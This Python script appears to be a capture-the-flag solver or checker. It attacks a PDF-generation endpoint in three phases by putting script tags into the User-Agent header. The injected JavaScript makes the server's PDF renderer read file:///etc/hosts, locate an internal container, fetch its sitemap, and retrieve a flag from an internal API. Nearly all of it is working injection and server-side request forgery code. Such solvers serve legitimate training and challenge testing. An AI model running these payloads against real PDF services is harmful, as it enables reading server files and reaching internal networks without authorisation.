#!/usr/bin/python3
from tika import parser
import requests
import re
import os
import sys

if len(sys.argv) < 3:
    print(f"Usage  : {sys.argv[0]} <domainname> <port>")
    print(f"Example: {sys.argv[0]} carnageflask.com 5000")
    exit(0)

# Phase 1, get nodeapi ip address from Flask container's hosts file
headers = {
    'User-Agent': '<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/hosts");x.send();</script>',
}
data = {"pdf_form": "test"}
r = requests.post(f"http://{sys.argv[1]}:{sys.argv[2]}/pdf", data=data, headers=headers)

hosts_out_file = "hosts.pdf"
with open(hosts_out_file, 'wb') as f:
    f.write(r.content)
    raw = parser.from_file(hosts_out_file)
    content = raw["content"]

    regex = "([0-9]*\.[0-9]*\.[0-9]*\.[0-9]*).*nodeapi"
    m = re.findall(regex, content)
    if m:
        nodeapi = m[0]


# Phase 2, get flag endpoint from nodeapi (other docker container) sitemap by injection a Javascript GET request into the PDF
headers = {
        'User-Agent': f"<script>x=new XMLHttpRequest;x.onload=function(){{document.write(this.responseText)}};x.open(\"GET\",\"http://{nodeapi}:3000/sitemap.xml\");x.send();</script>",
}
data = {"pdf_form": "test"}
r = requests.post(f"http://{sys.argv[1]}:{sys.argv[2]}/pdf", data=data, headers=headers)

sitemap_out_file = "sitemap.pdf"
with open(sitemap_out_file, 'wb') as f:
    f.write(r.content)
    raw = parser.from_file(sitemap_out_file)
    content = raw["content"]

    regex = ".*(http:\/\/nodeapi:3000\/api\/flag).*"
    m = re.findall(regex, content)
    if m:
        flag_endpoint = m[0]


# Phase 3, after contestants get the internal hostname and flag endpoint of nodeapi, inject a Javascript API call to get the flag
headers = {
        'User-Agent': f"<script>x=new XMLHttpRequest;x.onload=function(){{document.write(this.responseText)}};x.open(\"GET\",\"{flag_endpoint}\");x.send();</script>",
}
data = {"pdf_form": "test"}
r = requests.post(f"http://{sys.argv[1]}:{sys.argv[2]}/pdf", data=data, headers=headers)

flag_out_file = "flag.pdf"
with open(flag_out_file, 'wb') as f:
    f.write(r.content)
    raw = parser.from_file(flag_out_file)
    content = raw["content"]

    if "CSR{" in content.strip():
        print(0)
    else:
        print(1)

os.remove(hosts_out_file)
os.remove(sitemap_out_file)
os.remove(flag_out_file)
